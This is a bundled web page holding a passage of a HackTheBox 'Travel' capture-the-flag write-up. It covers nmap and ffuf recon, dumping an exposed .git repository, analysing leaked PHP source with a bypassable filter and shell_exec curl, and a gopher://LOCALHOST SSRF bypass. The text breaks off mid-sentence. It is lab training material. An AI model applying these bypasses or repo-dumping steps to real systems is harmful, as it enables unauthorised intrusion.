"use strict";(self.webpackChunkcyfun_me=self.webpackChunkcyfun_me||[]).push([[8196],{3905:(e,t,n)=>{n.d(t,{Zo:()=>c,kt:()=>m});var a=n(67294);function r(e,t,n){return t in e?Object.defineProperty(e,t,{value:n,enumerable:!0,configurable:!0,writable:!0}):e[t]=n,e}function l(e,t){var n=Object.keys(e);if(Object.getOwnPropertySymbols){var a=Object.getOwnPropertySymbols(e);t&&(a=a.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),n.push.apply(n,a)}return n}function i(e){for(var t=1;t<arguments.length;t++){var n=null!=arguments[t]?arguments[t]:{};t%2?l(Object(n),!0).forEach((function(t){r(e,t,n[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(n)):l(Object(n)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(n,t))}))}return e}function o(e,t){if(null==e)return{};var n,a,r=function(e,t){if(null==e)return{};var n,a,r={},l=Object.keys(e);for(a=0;a<l.length;a++)n=l[a],t.indexOf(n)>=0||(r[n]=e[n]);return r}(e,t);if(Object.getOwnPropertySymbols){var l=Object.getOwnPropertySymbols(e);for(a=0;a<l.length;a++)n=l[a],t.indexOf(n)>=0||Object.prototype.propertyIsEnumerable.call(e,n)&&(r[n]=e[n])}return r}var s=a.createContext({}),p=function(e){var t=a.useContext(s),n=t;return e&&(n="function"==typeof e?e(t):i(i({},t),e)),n},c=function(e){var t=p(e.components);return a.createElement(s.Provider,{value:t},e.children)},h="mdxType",d={inlineCode:"code",wrapper:function(e){var t=e.children;return a.createElement(a.Fragment,{},t)}},u=a.forwardRef((function(e,t){var n=e.components,r=e.mdxType,l=e.originalType,s=e.parentName,c=o(e,["components","mdxType","originalType","parentName"]),h=p(n),u=r,m=h["".concat(s,".").concat(u)]||h[u]||d[u]||l;return n?a.createElement(m,i(i({ref:t},c),{},{components:n})):a.createElement(m,i({ref:t},c))}));function m(e,t){var n=arguments,r=t&&t.mdxType;if("string"==typeof e||r){var l=n.length,i=new Array(l);i[0]=u;var o={};for(var s in t)hasOwnProperty.call(t,s)&&(o[s]=t[s]);o.originalType=e,o[h]="string"==typeof e?e:r,i[1]=o;for(var p=2;p<l;p++)i[p]=n[p];return a.createElement.apply(null,i)}return a.createElement.apply(null,n)}u.displayName="MDXCreateElement"},39281:(e,t,n)=>{n.r(t),n.d(t,{assets:()=>s,contentTitle:()=>i,default:()=>d,frontMatter:()=>l,metadata:()=>o,toc:()=>p});var a=n(87462),r=(n(67294),n(3905));const l={layout:"post",title:"Travel ",lang:"en",categories:["writeups"],tags:["security","writeups","linux","recon","network","pe","exploit","htb","git","php","gopher","bypass","rce","cracking"],date:"2020/09/15",thumbnail:"/img/HackTheBox/travel.png",toc:!0},i="Information",o={unversionedId:"HackTheBox/Travel/write-up",id:"HackTheBox/Travel/write-up",title:"Travel ",description:"- Name: Travel",source:"@site/writeups/HackTheBox/Travel/write-up.md",sourceDirName:"HackTheBox/Travel",slug:"/HackTheBox/Travel/write-up",permalink:"/writeups/HackTheBox/Travel/write-up",draft:!1,tags:[{label:"security",permalink:"/writeups/tags/security"},{label:"writeups",permalink:"/writeups/tags/writeups"},{label:"linux",permalink:"/writeups/tags/linux"},{label:"recon",permalink:"/writeups/tags/recon"},{label:"network",permalink:"/writeups/tags/network"},{label:"pe",permalink:"/writeups/tags/pe"},{label:"exploit",permalink:"/writeups/tags/exploit"},{label:"htb",permalink:"/writeups/tags/htb"},{label:"git",permalink:"/writeups/tags/git"},{label:"php",permalink:"/writeups/tags/php"},{label:"gopher",permalink:"/writeups/tags/gopher"},{label:"bypass",permalink:"/writeups/tags/bypass"},{label:"rce",permalink:"/writeups/tags/rce"},{label:"cracking",permalink:"/writeups/tags/cracking"}],version:"current",frontMatter:{layout:"post",title:"Travel ",lang:"en",categories:["writeups"],tags:["security","writeups","linux","recon","network","pe","exploit","htb","git","php","gopher","bypass","rce","cracking"],date:"2020/09/15",thumbnail:"/img/HackTheBox/travel.png",toc:!0},sidebar:"tutorialSidebar",previous:{title:"Traceback ",permalink:"/writeups/HackTheBox/Traceback/write-up"},next:{title:"Traverxec ",permalink:"/writeups/HackTheBox/Traverxec/write-up"}},s={},p=[{value:"Overview",id:"overview",level:2},{value:"Network enumeration",id:"network-enumeration",level:2},{value:"HTTP discovery",id:"http-discovery",level:2},{value:"HTTP enumeration",id:"http-enumeration",level:2},{value:"HTTP exploitation &amp; code analysis",id:"http-exploitation--code-analysis",level:2},{value:"Privilege Escalation of Machine : from www-data to lynik-admin",id:"privilege-escalation-of-machine--from-www-data-to-lynik-admin",level:2},{value:"Privilege Escalation of Machine : from lynik-admin to root",id:"privilege-escalation-of-machine--from-lynik-admin-to-root",level:2}],c={toc:p},h="wrapper";function d(e){let{components:t,...l}=e;return(0,r.kt)(h,(0,a.Z)({},c,l,{components:t,mdxType:"MDXLayout"}),(0,r.kt)("h1",{id:"information"},"Information"),(0,r.kt)("ul",null,(0,r.kt)("li",{parentName:"ul"},(0,r.kt)("strong",{parentName:"li"},"Name:")," Travel"),(0,r.kt)("li",{parentName:"ul"},(0,r.kt)("strong",{parentName:"li"},"Profile:")," ",(0,r.kt)("a",{parentName:"li",href:"https://www.hackthebox.eu/home/machines/profile/252"},"www.hackthebox.eu")),(0,r.kt)("li",{parentName:"ul"},(0,r.kt)("strong",{parentName:"li"},"Difficulty:")," Hard"),(0,r.kt)("li",{parentName:"ul"},(0,r.kt)("strong",{parentName:"li"},"OS:")," Linux"),(0,r.kt)("li",{parentName:"ul"},(0,r.kt)("strong",{parentName:"li"},"Points:")," 40")),(0,r.kt)("p",null,(0,r.kt)("img",{alt:"Travel",src:n(88807).Z,width:"598",height:"381"})),(0,r.kt)("h2",{id:"overview"},"Overview"),(0,r.kt)("p",null,(0,r.kt)("strong",{parentName:"p"},"TL;DR"),": Tricky RCE exploiting PHP deserialization through memcache over gopher. Then pe through password hash cracking & docker."),(0,r.kt)("p",null,"Install tools used in this WU on BlackArch Linux:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"pacman -S nmap ffuf gittools haiti git openssh gopherus openldap gtfo gtfoblookup\n")),(0,r.kt)("h2",{id:"network-enumeration"},"Network enumeration"),(0,r.kt)("p",null,"Port & service discovery with a ",(0,r.kt)("a",{parentName:"p",href:"https://nmap.org/"},"nmap")," scan:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"# Nmap 7.80 scan initiated Fri Jul 31 19:52:02 2020 as: nmap -p- -sSVC -oA nmap_full -v 10.10.10.189\nNmap scan report for 10.10.10.189\nHost is up (0.023s latency).\nNot shown: 65532 closed ports\nPORT    STATE SERVICE  VERSION\n22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)\n80/tcp  open  http     nginx 1.17.6\n| http-methods:\n|_  Supported Methods: GET HEAD\n|_http-server-header: nginx/1.17.6\n|_http-title: Travel.HTB\n443/tcp open  ssl/http nginx 1.17.6\n| http-methods:\n|_  Supported Methods: GET HEAD\n|_http-server-header: nginx/1.17.6\n|_http-title: Travel.HTB - SSL coming soon.\n| ssl-cert: Subject: commonName=www.travel.htb/organizationName=Travel.HTB/countryName=UK\n| Subject Alternative Name: DNS:www.travel.htb, DNS:blog.travel.htb, DNS:blog-dev.travel.htb\n| Issuer: commonName=www.travel.htb/organizationName=Travel.HTB/countryName=UK\n| Public Key type: rsa\n| Public Key bits: 2048\n| Signature Algorithm: sha256WithRSAEncryption\n| Not valid before: 2020-04-23T19:24:29\n| Not valid after:  2030-04-21T19:24:29\n| MD5:   ef0a a4c1 fbad 1ac4 d160 58e3 beac 9698\n|_SHA-1: 0170 7c30 db3e 2a93 cda7 7bbe 8a8b 7777 5bcd 0498\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nRead data files from: /usr/bin/../share/nmap\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\n# Nmap done at Fri Jul 31 19:52:39 2020 -- 1 IP address (1 host up) scanned in 36.46 seconds\n")),(0,r.kt)("p",null,"Let's add the local domain to our host file, it's important not to miss\nthe ",(0,r.kt)("strong",{parentName:"p"},"Subject Alternative Name")," from the ",(0,r.kt)("a",{parentName:"p",href:"https://nmap.org/"},"nmap")," scan:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"$ cat /etc/hosts | grep travel\n10.10.10.189 travel.htb\n10.10.10.189 www.travel.htb\n10.10.10.189 blog.travel.htb\n10.10.10.189 blog-dev.travel.htb\n")),(0,r.kt)("h2",{id:"http-discovery"},"HTTP discovery"),(0,r.kt)("p",null,"The site on port 80 ",(0,r.kt)("a",{parentName:"p",href:"http://www.travel.htb/"},"http://www.travel.htb/")," is just a default HTML template."),(0,r.kt)("p",null,(0,r.kt)("img",{parentName:"p",src:"https://i.imgur.com/doys5UU.png",alt:"port 80 website"})),(0,r.kt)("p",null,"The site on port 443 ",(0,r.kt)("a",{parentName:"p",href:"https://www.travel.htb/"},"https://www.travel.htb/")," seems not available yet."),(0,r.kt)("p",null,(0,r.kt)("img",{parentName:"p",src:"https://i.imgur.com/TfJvags.jpg",alt:"port 443 website"})),(0,r.kt)("p",null,"At first glance, there is nothing, so we'll need enumeration."),(0,r.kt)("h2",{id:"http-enumeration"},"HTTP enumeration"),(0,r.kt)("p",null,"With ",(0,r.kt)("a",{parentName:"p",href:"https://github.com/ffuf/ffuf"},"ffuf")," I'll try to find some sub-directories or pages:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"$ ffuf -u http://www.travel.htb/FUZZ -r -c -w ~/CTF/tools/SecLists/Discovery/Web-Content/raft-small-words-lowercase.txt -e .txt,.html,.php\n\n        /'___\\  /'___\\           /'___\\\n       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/\n       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\\n        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/\n         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\\n          \\/_/    \\/_/   \\/___/    \\/_/\n\n       v1.2.0-git\n________________________________________________\n\n :: Method           : GET\n :: URL              : http://www.travel.htb/FUZZ\n :: Wordlist         : FUZZ: /home/cyfun/CTF/tools/SecLists/Discovery/Web-Content/raft-small-words-lowercase.txt\n :: Extensions       : .txt .html .php\n :: Follow redirects : true\n :: Calibration      : false\n :: Timeout          : 10\n :: Threads          : 40\n :: Matcher          : Response status: 200,204,301,302,307,401,403\n________________________________________________\n\nindex.html              [Status: 200, Size: 5093, Words: 842, Lines: 145]\njs                      [Status: 403, Size: 154, Words: 3, Lines: 8]\ncss                     [Status: 403, Size: 154, Words: 3, Lines: 8]\nimg                     [Status: 403, Size: 154, Words: 3, Lines: 8]\nlib                     [Status: 403, Size: 154, Words: 3, Lines: 8]\n.                       [Status: 200, Size: 5093, Words: 842, Lines: 145]\nnewsfeed                [Status: 403, Size: 154, Words: 3, Lines: 8]\n:: Progress: [153068/153068] :: Job [1/1] :: 1000 req/sec :: Duration: [0:02:33] :: Errors: 0 ::\n")),(0,r.kt)("p",null,"Nothing on the HTTP site. But we didn't found many thing either for the HTTPS\nwebsite:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"$ ffuf -u https://www.travel.htb/FUZZ -r -c -w ~/CTF/tools/SecLists/Discovery/Web-Content/raft-small-words-lowercase.txt -e .txt,.html,.php\n\n        /'___\\  /'___\\           /'___\\\n       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/\n       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\\n        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/\n         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\\n          \\/_/    \\/_/   \\/___/    \\/_/\n\n       v1.2.0-git\n________________________________________________\n\n :: Method           : GET\n :: URL              : https://www.travel.htb/FUZZ\n :: Wordlist         : FUZZ: /home/cyfun/CTF/tools/SecLists/Discovery/Web-Content/raft-small-words-lowercase.txt\n :: Extensions       : .txt .html .php\n :: Follow redirects : true\n :: Calibration      : false\n :: Timeout          : 10\n :: Threads          : 40\n :: Matcher          : Response status: 200,204,301,302,307,401,403\n________________________________________________\n\nindex.html              [Status: 200, Size: 1123, Words: 104, Lines: 52]\n.                       [Status: 200, Size: 1123, Words: 104, Lines: 52]\n:: Progress: [153068/153068] :: Job [1/1] :: 950 req/sec :: Duration: [0:02:41] :: Errors: 0 ::\n")),(0,r.kt)("p",null,"The SSL version of blog.travel.htb and blog-dev.travel.htb are both serving the\nsame content as ",(0,r.kt)("a",{parentName:"p",href:"https://www.travel.htb/"},"https://www.travel.htb/")," but the version in HTTP is different."),(0,r.kt)("p",null,(0,r.kt)("a",{parentName:"p",href:"http://blog.travel.htb/"},"http://blog.travel.htb/")),(0,r.kt)("p",null,(0,r.kt)("img",{parentName:"p",src:"https://i.imgur.com/XchKS7O.png",alt:"blog.travel.htb"})),(0,r.kt)("p",null,"We may have a hint here:"),(0,r.kt)("blockquote",null,(0,r.kt)("p",{parentName:"blockquote"},"Welcome to our Travel Blog. Make sure to check out our new RSS feature coming fresh from our blog-dev team!")),(0,r.kt)("p",null,"The feed URL is: ",(0,r.kt)("a",{parentName:"p",href:"http://blog.travel.htb/feed/"},"http://blog.travel.htb/feed/")),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-xml"},'<rss xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:wfw="http://wellformedweb.org/CommentAPI/" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:sy="http://purl.org/rss/1.0/modules/syndication/" xmlns:slash="http://purl.org/rss/1.0/modules/slash/" version="2.0">\n<channel>\n<title>Travel Blog</title>\n<atom:link href="http://blog.travel.htb/feed/" rel="self" type="application/rss+xml"/>\n<link>http://blog.travel.htb</link>\n<description>Who doesn\'t love to travel ?</description>\n<lastBuildDate>Thu, 23 Apr 2020 19:27:27 +0000</lastBuildDate>\n<language>en-US</language>\n<sy:updatePeriod> hourly </sy:updatePeriod>\n<sy:updateFrequency> 1 </sy:updateFrequency>\n<generator>https://wordpress.org/?v=5.4</generator>\n<item>\n<title>Travel Blog</title>\n<link>http://blog.travel.htb/2020/04/13/hello-world/</link>\n<dc:creator>\n<![CDATA[ admin ]]>\n</dc:creator>\n<pubDate>Mon, 13 Apr 2020 13:19:01 +0000</pubDate>\n<category>\n<![CDATA[ Uncategorized ]]>\n</category>\n<guid isPermaLink="false">http://localhost/?p=1</guid>\n<description>\n<![CDATA[ Welcome to our Travel Blog. Make sure to check out our new RSS feature coming fresh from our blog-dev team! ]]>\n</description>\n<content:encoded>\n<![CDATA[ <p>Welcome to our Travel Blog. Make sure to check out our new RSS feature coming fresh from our blog-dev team!</p> ]]>\n</content:encoded>\n</item>\n</channel>\n</rss>\n')),(0,r.kt)("p",null,"Nothing fancy, but it seems to leak the Wordpress version."),(0,r.kt)("p",null,"We also have a login area: ",(0,r.kt)("a",{parentName:"p",href:"http://blog.travel.htb/wp-login.php"},"http://blog.travel.htb/wp-login.php")),(0,r.kt)("p",null,"I ran a ",(0,r.kt)("a",{parentName:"p",href:"https://github.com/ffuf/ffuf"},"ffuf")," enumeration but won't display it here as it only shows all the\nWordpress files."),(0,r.kt)("p",null,(0,r.kt)("a",{parentName:"p",href:"http://blog-dev.travel.htb/"},"http://blog-dev.travel.htb/")),(0,r.kt)("p",null,(0,r.kt)("img",{parentName:"p",src:"https://i.imgur.com/Hp0emdU.png",alt:"blog-dev.travel.htb"})),(0,r.kt)("p",null,"It seems we are denied but it's worth checking if we can leak some files."),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"$ ffuf -u http://blog-dev.travel.htb/FUZZ -r -c -w ~/CTF/tools/SecLists/Discovery/Web-Content/raft-small-words-lowercase.txt -e .txt,.html,.php\n\n        /'___\\  /'___\\           /'___\\\n       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/\n       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\\n        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/\n         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\\n          \\/_/    \\/_/   \\/___/    \\/_/\n\n       v1.2.0-git\n________________________________________________\n\n :: Method           : GET\n :: URL              : http://blog-dev.travel.htb/FUZZ\n :: Wordlist         : FUZZ: /home/cyfun/CTF/tools/SecLists/Discovery/Web-Content/raft-small-words-lowercase.txt\n :: Extensions       : .txt .html .php\n :: Follow redirects : true\n :: Calibration      : false\n :: Timeout          : 10\n :: Threads          : 40\n :: Matcher          : Response status: 200,204,301,302,307,401,403\n________________________________________________\n\n.                       [Status: 403, Size: 154, Words: 3, Lines: 8]\n.git                    [Status: 403, Size: 154, Words: 3, Lines: 8]\n")),(0,r.kt)("p",null,"It seems like there is a git repository."),(0,r.kt)("h2",{id:"http-exploitation--code-analysis"},"HTTP exploitation & code analysis"),(0,r.kt)("p",null,"Let's start with the git repository with ",(0,r.kt)("a",{parentName:"p",href:"https://github.com/internetwache/GitTools"},"GitTools")," that will allow us\nto dump it."),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"$ gittools-gitdumper http://blog-dev.travel.htb/.git/ dev-repo\n###########\n# GitDumper is part of https://github.com/internetwache/GitTools\n#\n# Developed and maintained by @gehaxelt from @internetwache\n#\n# Use at your own risk. Usage might be illegal in certain circumstances.\n# Only for educational purposes!\n###########\n\n\n[*] Destination folder does not exist\n[+] Creating dev-repo/.git/\n[+] Downloaded: HEAD\n[-] Downloaded: objects/info/packs\n[+] Downloaded: description\n[+] Downloaded: config\n[+] Downloaded: COMMIT_EDITMSG\n[+] Downloaded: index\n[-] Downloaded: packed-refs\n[+] Downloaded: refs/heads/master\n[-] Downloaded: refs/remotes/origin/HEAD\n[-] Downloaded: refs/stash\n[+] Downloaded: logs/HEAD\n[+] Downloaded: logs/refs/heads/master\n[-] Downloaded: logs/refs/remotes/origin/HEAD\n[-] Downloaded: info/refs\n[+] Downloaded: info/exclude\n[-] Downloaded: /refs/wip/index/refs/heads/master\n[-] Downloaded: /refs/wip/wtree/refs/heads/master\n[+] Downloaded: objects/03/13850ae948d71767aff2cc8cc0f87a0feeef63\n[-] Downloaded: objects/00/00000000000000000000000000000000000000\n[+] Downloaded: objects/b0/2b083f68102c4d62c49ed3c99ccbb31632ae9f\n[+] Downloaded: objects/ed/116c7c7c51645f1e8a403bcec44873f74208e9\n[+] Downloaded: objects/2b/1869f5a2d50f0ede787af91b3ff376efb7b039\n[+] Downloaded: objects/30/b6f36ec80e8bc96451e47c49597fdd64cee2da\n")),(0,r.kt)("p",null,"Then we can look into this repository:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},'$ git status\nOn branch master\nChanges not staged for commit:\n  (use "git add/rm <file>..." to update what will be committed)\n  (use "git restore <file>..." to discard changes in working directory)\n        deleted:    README.md\n        deleted:    rss_template.php\n        deleted:    template.php\n\n$ git restore README.md rss_template.php template.php\n')),(0,r.kt)("p",null,"It seems we can now read the source code of the RSS generator:\n",(0,r.kt)("inlineCode",{parentName:"p"},"rss_template.php"),"."),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-php"},"<?php\n/*\nTemplate Name: Awesome RSS\n*/\ninclude('template.php');\nget_header();\n?>\n\n<main class=\"section-inner\">\n    <?php\n    function get_feed($url){\n     require_once ABSPATH . '/wp-includes/class-simplepie.php';\n     $simplepie = null;\n     $data = url_get_contents($url);\n     if ($url) {\n         $simplepie = new SimplePie();\n         $simplepie->set_cache_location('memcache://127.0.0.1:11211/?timeout=60&prefix=xct_');\n         //$simplepie->set_raw_data($data);\n         $simplepie->set_feed_url($url);\n         $simplepie->init();\n         $simplepie->handle_content_type();\n         if ($simplepie->error) {\n             error_log($simplepie->error);\n             $simplepie = null;\n             $failed = True;\n         }\n     } else {\n         $failed = True;\n     }\n     return $simplepie;\n     }\n\n    $url = $_SERVER['QUERY_STRING'];\n    if(strpos($url, \"custom_feed_url\") !== false){\n        $tmp = (explode(\"=\", $url));\n        $url = end($tmp);\n     } else {\n        $url = \"http://www.travel.htb/newsfeed/customfeed.xml\";\n     }\n     $feed = get_feed($url);\n     if ($feed->error())\n        {\n            echo '<div class=\"sp_errors\">' . \"\\r\\n\";\n            echo '<p>' . htmlspecialchars($feed->error()) . \"</p>\\r\\n\";\n            echo '</div>' . \"\\r\\n\";\n        }\n        else {\n    ?>\n    <div class=\"chunk focus\">\n        <h3 class=\"header\">\n        <?php\n            $link = $feed->get_link();\n            $title = $feed->get_title();\n            if ($link)\n            {\n                $title = \"<a href='$link' title='$title'>$title</a>\";\n            }\n            echo $title;\n        ?>\n        </h3>\n        <?php echo $feed->get_description(); ?>\n\n    </div>\n    <?php foreach($feed->get_items() as $item): ?>\n        <div class=\"chunk\">\n            <h4><?php if ($item->get_permalink()) echo '<a href=\"' . $item->get_permalink() . '\">'; echo $item->get_title(); if ($item->get_permalink()) echo '</a>'; ?>&nbsp;<span class=\"footnote\"><?php echo $item->get_date('j M Y, g:i a'); ?></span></h4>\n            <?php echo $item->get_content(); ?>\n            <?php\n            if ($enclosure = $item->get_enclosure(0))\n            {\n                echo '<div align=\"center\">';\n                echo '<p>' . $enclosure->embed(array(\n                    'audio' => './for_the_demo/place_audio.png',\n                    'video' => './for_the_demo/place_video.png',\n                    'mediaplayer' => './for_the_demo/mediaplayer.swf',\n                    'altclass' => 'download'\n                )) . '</p>';\n                if ($enclosure->get_link() && $enclosure->get_type())\n                {\n                    echo '<p class=\"footnote\" align=\"center\">(' . $enclosure->get_type();\n                    if ($enclosure->get_size())\n                    {\n                        echo '; ' . $enclosure->get_size() . ' MB';\n                    }\n                    echo ')</p>';\n                }\n                if ($enclosure->get_thumbnail())\n                {\n                    echo '<div><img src=\"' . $enclosure->get_thumbnail() . '\" alt=\"\" /></div>';\n                }\n                echo '</div>';\n            }\n            ?>\n\n        </div>\n    <?php endforeach; ?>\n<?php } ?>\n</main>\n\n\x3c!--\nDEBUG\n<?php\nif (isset($_GET['debug'])){\n  include('debug.php');\n}\n?>\n--\x3e\n\n<?php get_template_part( 'template-parts/footer-menus-widgets' ); ?>\n\n<?php\nget_footer();\n")),(0,r.kt)("p",null,"Lines 33, 34, 40 seems to show a user controlled input. Lines 103, 104 teels use we can enable\na debug feature that may be show more verbose messages. On line 5, ",(0,r.kt)("inlineCode",{parentName:"p"},"template.php")," is included\nso let's take a look at it."),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-php"},'<?php\n\n/**\n Todo: finish logging implementation via TemplateHelper\n*/\n\nfunction safe($url)\n{\n    // this should be secure\n    $tmpUrl = urldecode($url);\n    if(strpos($tmpUrl, "file://") !== false or strpos($tmpUrl, "@") !== false)\n    {\n        die("<h2>Hacking attempt prevented (LFI). Event has been logged.</h2>");\n    }\n    if(strpos($tmpUrl, "-o") !== false or strpos($tmpUrl, "-F") !== false)\n    {\n        die("<h2>Hacking attempt prevented (Command Injection). Event has been logged.</h2>");\n    }\n    $tmp = parse_url($url, PHP_URL_HOST);\n    // preventing all localhost access\n    if($tmp == "localhost" or $tmp == "127.0.0.1")\n    {\n        die("<h2>Hacking attempt prevented (Internal SSRF). Event has been logged.</h2>");\n    }\n    return $url;\n}\n\nfunction url_get_contents ($url) {\n    $url = safe($url);\n    $url = escapeshellarg($url);\n    $pl = "curl ".$url;\n    $output = shell_exec($pl);\n    return $output;\n}\n\n\nclass TemplateHelper\n{\n\n    private $file;\n    private $data;\n\n    public function __construct(string $file, string $data)\n    {\n        $this->init($file, $data);\n    }\n\n    public function __wakeup()\n    {\n        $this->init($this->file, $this->data);\n    }\n\n    private function init(string $file, string $data)\n    {\n        $this->file = $file;\n        $this->data = $data;\n        file_put_contents(__DIR__.\'/logs/\'.$this->file, $this->data);\n    }\n}\n')),(0,r.kt)("p",null,"What we saw in ",(0,r.kt)("inlineCode",{parentName:"p"},"rss_template.php"),":"),(0,r.kt)("ol",null,(0,r.kt)("li",{parentName:"ol"},"L40 ",(0,r.kt)("inlineCode",{parentName:"li"},"get_feed()")," is called with ",(0,r.kt)("inlineCode",{parentName:"li"},"$url")," as arg"),(0,r.kt)("li",{parentName:"ol"},"L33 ",(0,r.kt)("inlineCode",{parentName:"li"},"$url")," is user controlled via ",(0,r.kt)("inlineCode",{parentName:"li"},"custom_feed_url")," in the URL"),(0,r.kt)("li",{parentName:"ol"},"L14 In ",(0,r.kt)("inlineCode",{parentName:"li"},"get_feed()")," the function ",(0,r.kt)("inlineCode",{parentName:"li"},"url_get_contents()")," is called")),(0,r.kt)("p",null,(0,r.kt)("inlineCode",{parentName:"p"},"url_get_contents()")," is a custom function that reminds us the official\n",(0,r.kt)("a",{parentName:"p",href:"https://www.php.net/manual/en/function.file-get-contents"},"file_get_contents")," function."),(0,r.kt)("p",null,"Now what we can see in ",(0,r.kt)("inlineCode",{parentName:"p"},"template.php"),":"),(0,r.kt)("ol",null,(0,r.kt)("li",{parentName:"ol"},"L28-34 ",(0,r.kt)("inlineCode",{parentName:"li"},"url_get_contents()")," is defined")),(0,r.kt)("ul",null,(0,r.kt)("li",{parentName:"ul"},"L29 the ",(0,r.kt)("inlineCode",{parentName:"li"},"safe()")," custom function is called"),(0,r.kt)("li",{parentName:"ul"},"L30 the ",(0,r.kt)("inlineCode",{parentName:"li"},"escapeshellarg()")," native function is called (see ",(0,r.kt)("a",{parentName:"li",href:"https://www.php.net/manual/en/function.escapeshellarg"},"the doc"),")"),(0,r.kt)("li",{parentName:"ul"},"L31-32 ",(0,r.kt)("inlineCode",{parentName:"li"},"curl")," is called inside ",(0,r.kt)("inlineCode",{parentName:"li"},"shell_exec()")," with user controlled argument"),(0,r.kt)("li",{parentName:"ul"},"This gives potential for local file disclosure, SSRF and RCE. Maybe even XXE if SimplePie parser is vulnerable.")),(0,r.kt)("ol",{start:2},(0,r.kt)("li",{parentName:"ol"},"L7-26 the ",(0,r.kt)("inlineCode",{parentName:"li"},"safe()")," function seems to some basic filtering that is bypassable")),(0,r.kt)("p",null,"The feed seems available for display at those endpoints:"),(0,r.kt)("ul",null,(0,r.kt)("li",{parentName:"ul"},"(raw) ",(0,r.kt)("a",{parentName:"li",href:"http://www.travel.htb/newsfeed/customfeed.xml"},"http://www.travel.htb/newsfeed/customfeed.xml")),(0,r.kt)("li",{parentName:"ul"},"(parsed) ",(0,r.kt)("a",{parentName:"li",href:"http://blog.travel.htb/awesome-rss/"},"http://blog.travel.htb/awesome-rss/"))),(0,r.kt)("p",null,"However the feed ",(0,r.kt)("a",{parentName:"p",href:"http://blog.travel.htb/feed/"},"http://blog.travel.htb/feed/")," we saw earlier seems to be completely\ndifferent and won't interest us."),(0,r.kt)("p",null,"It seems that ",(0,r.kt)("a",{parentName:"p",href:"http://blog.travel.htb/awesome-rss/"},"http://blog.travel.htb/awesome-rss/")," is using ",(0,r.kt)("inlineCode",{parentName:"p"},"rss_template.php"),"\nto parse ",(0,r.kt)("a",{parentName:"p",href:"http://www.travel.htb/newsfeed/customfeed.xml"},"http://www.travel.htb/newsfeed/customfeed.xml")," and render it in HTML."),(0,r.kt)("p",null,(0,r.kt)("img",{parentName:"p",src:"https://i.imgur.com/ewSwvvM.png",alt:null})),(0,r.kt)("p",null,"We can alter this behavior by providing another feed source with the parameter\n",(0,r.kt)("inlineCode",{parentName:"p"},"custom_feed_url"),". For example we can provide this alternative RSS\nsource: ",(0,r.kt)("a",{parentName:"p",href:"http://blog.travel.htb/awesome-rss/?custom_feed_url=http://blog.travel.htb/feed/"},"http://blog.travel.htb/awesome-rss/?custom_feed_url=http://blog.travel.htb/feed/"),"."),(0,r.kt)("p",null,(0,r.kt)("img",{parentName:"p",src:"https://i.imgur.com/mdFclUw.png",alt:null})),(0,r.kt)("p",null,"The ",(0,r.kt)("inlineCode",{parentName:"p"},"safe()")," function disable us to use ",(0,r.kt)("inlineCode",{parentName:"p"},"file://")," protocol but ",(0,r.kt)("inlineCode",{parentName:"p"},"gopher://")," may\nbe use instead. ",(0,r.kt)("inlineCode",{parentName:"p"},"127.0.0.1")," and ",(0,r.kt)("inlineCode",{parentName:"p"},"localhost")," are filtered but that's easily\nbypassable."),(0,r.kt)("p",null,"L17 we also saw there was a memcache server. ",(0,r.kt)("inlineCode",{parentName:"p"},"gopher://")," will allow us to interact\nwith memcache so it seems the way to go."),(0,r.kt)("p",null,"Let's see if we can craft a gopher payload that bypass the filters\nto check if we can use gopher."),(0,r.kt)("p",null,"Let's quickly check that the string comparison is case sensitive in PHP.\nHopefully URL are case insensitive so ",(0,r.kt)("inlineCode",{parentName:"p"},"LOCALHOST")," will be accepted by the server\nand not filtered by ",(0,r.kt)("inlineCode",{parentName:"p"},"safe()"),"."),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-php"},'php -a\nInteractive shell\n\nphp > var_dump("LOCALHOST" == "localhost");\nbool(false)\n')),(0,r.kt)("p",null,"Requesting on port 80 we can access the local HTTP server and bypass ",(0,r.kt)("inlineCode",{parentName:"p"},"safe()"),"."),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"http://blog.travel.htb/awesome-rss/?custom_feed_url=gopher://LOCALHOST:80/\n")),(0,r.kt)("p",null,(0,r.kt)("img",{parentName:"p",src:"https://i.imgur.com/Za3l1n8.png",alt:null})),(0,r.kt)("p",null,"Other localhost bypasses may be found on 